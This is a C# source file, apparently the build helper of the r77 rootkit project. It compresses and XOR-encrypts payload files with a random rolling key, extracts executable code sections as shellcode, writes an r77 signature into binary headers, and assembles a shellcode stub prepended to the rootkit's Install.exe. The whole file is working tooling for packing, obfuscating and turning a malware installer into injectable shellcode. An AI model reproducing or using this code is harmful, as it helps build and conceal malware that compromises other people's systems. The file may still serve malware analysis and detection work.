using BytecodeApi.Penetration;
using Global;
using System.Diagnostics;
using System.IO.Compression;
using System.Security.Cryptography;

// BuildTask.exe is used for VS build events.
// The first argument is a path to the file to be processed (except for -shellcodeinstaller)
//  - compress: Compress file
//  - encrypt: Encrypt file
//  - toshellcode: Extracts an executable file's .text section
//  - r77helper: Write R77_HELPER_SIGNATURE to r77 header
//  - shellcodeinstaller: Converts Install.exe to Install.shellcode

if (args.Length == 0)
{
	return 1;
}
else if (args[0] == "-shellcodeinstaller")
{
	if (!Directory.Exists(args[1])) return 1;

	return CreateShellCodeInstaller(args[1]) ? 0 : 1;
}
else
{
	if (!File.Exists(args[0])) return 1;

	byte[] file = File.ReadAllBytes(args[0]);
	if (args.Contains("-compress")) file = Compress(file);
	if (args.Contains("-encrypt")) file = Encrypt(file);
	if (args.Contains("-toshellcode")) file = Shellcode.ExtractFromExecutable(file);
	if (args.Contains("-r77helper")) file = R77Signature(file, R77Const.R77HelperSignature);

	File.WriteAllBytes(args[0], file);
	return 0;
}

static byte[] Compress(byte[] data)
{
	using MemoryStream memoryStream = new();
	using (GZipStream gzipStream = new(memoryStream, CompressionMode.Compress, true))
	{
		gzipStream.Write(data, 0, data.Length);
	}

	return memoryStream.ToArray();
}
static byte[] Encrypt(byte[] data)
{
	// A trivial encryption algorithm is sufficient and requires no .NET classes to be imported.

	byte[] keyBytes = RandomNumberGenerator.GetBytes(4);
	int key = BitConverter.ToInt32(keyBytes);

	byte[] encrypted = new byte[data.Length + 4];
	Buffer.BlockCopy(keyBytes, 0, encrypted, 0, 4);

	for (int i = 0; i < data.Length; i++)
	{
		encrypted[i + 4] = (byte)(data[i] ^ key);
		key = key << 1 | key >> (32 - 1);
	}

	return encrypted;
}
static byte[] R77Signature(byte[] file, ushort signature)
{
	// Write a 16-bit signature to the r77 header.
	byte[] newFile = file.ToArray();
	Buffer.BlockCopy(BitConverter.GetBytes(signature), 0, newFile, 64, 2); // The offset of the DOS stub is 64.
	return newFile;
}
static bool CreateShellCodeInstaller(string solutionDir)
{
	Directory.CreateDirectory(Path.Combine(solutionDir, @"InstallShellcode\bin"));

	string shellCodeExePath = Path.Combine(solutionDir, @"InstallShellcode\bin\InstallShellcode.exe");
	string shellCodePath = Path.Combine(solutionDir, @"InstallShellcode\bin\InstallShellcode.shellcode");

	if (FasmCompile(Path.Combine(solutionDir, @"SlnBin\FASM"), Path.Combine(solutionDir, @"InstallShellcode\InstallShellcode.asm"), shellCodeExePath))
	{
		byte[] shellCode = Shellcode.ExtractFromExecutable(File.ReadAllBytes(shellCodeExePath));
		File.WriteAllBytes(shellCodePath, shellCode);

		// Install.shellcode is literally just shellcode + Install.exe
		using FileStream file = File.Create(Path.Combine(solutionDir, @"$Build\Install.shellcode"));
		file.Write(shellCode);
		file.Write(File.ReadAllBytes(Path.Combine(solutionDir, @"$Build\Install.exe")));

		return true;
	}
	else
	{
		return false;
	}
}
static bool FasmCompile(string fasmPath, string asmFileName, string outputFileName)
{
	// Compiles an .asm file using FASM.exe

	Environment.SetEnvironmentVariable("INCLUDE", Path.Combine(fasmPath, "INCLUDE"), EnvironmentVariableTarget.Process);

	using Process? process = Process.Start(new ProcessStartInfo
	{
		FileName = Path.Combine(fasmPath, "FASM.exe"),
		Arguments = $"\"{asmFileName}\" \"{outputFileName}\"",
		UseShellExecute = false,
		CreateNoWindow = true
	});

	process?.WaitForExit();
	return process?.ExitCode == 0;
}